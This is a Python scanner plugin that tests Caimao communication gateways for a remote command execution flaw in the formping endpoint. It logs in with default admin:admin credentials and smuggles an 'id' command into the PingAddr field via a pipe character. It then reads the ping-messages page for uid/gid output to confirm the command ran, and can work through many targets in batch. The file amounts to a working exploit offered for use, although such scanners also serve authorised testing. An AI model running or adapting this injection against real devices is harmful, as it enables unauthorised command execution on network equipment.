import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Caimao_formping_rce_Scan:
    def main(self,target):
        self.batch = target["batch_work"]

        baseurl = target['url'].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Caimao", '开始执行才茂通信网关formping远程命令执行检测...')
        url=baseurl+'/goform/formping'
        body='PingAddr=127.0.0.1%7Cid&PingPackNumb=1&PingMsg='
        h = {"User-Agent":header,"Authorization": "Basic YWRtaW46YWRtaW4="}
        try:
            response=requests.post(url,body,headers=h,verify=self.ssl,proxies=self.proxy,timeout=8,allow_redirects = False)

            url2 = baseurl+'/pingmessages'
            r2 = requests.get(url2,verify=self.ssl,proxies=self.proxy,headers=h,timeout=8,allow_redirects = False)
            if 'uid=' in r2.text and r2.status_code==200 and 'gid=' in r2.text:
                OutPrintInfoSuc("Caimao", f'存在才茂通信网关远程命令执行漏洞{url}')
                if self.batch:
                    OutPutFile("caimao_formping_rce.txt",f'存在才茂通信网关远程命令执行漏洞{url}')
            else:
                if not self.batch:
                    OutPrintInfo("Caimao", '不存在才茂通信网关formping远程命令执行')
        except Exception:
            if not self.batch:
                OutPrintInfo("Caimao", '目标请求出错')
        if not self.batch:
            OutPrintInfo("Caimao", '才茂通信网关formping远程命令执行检测结束')
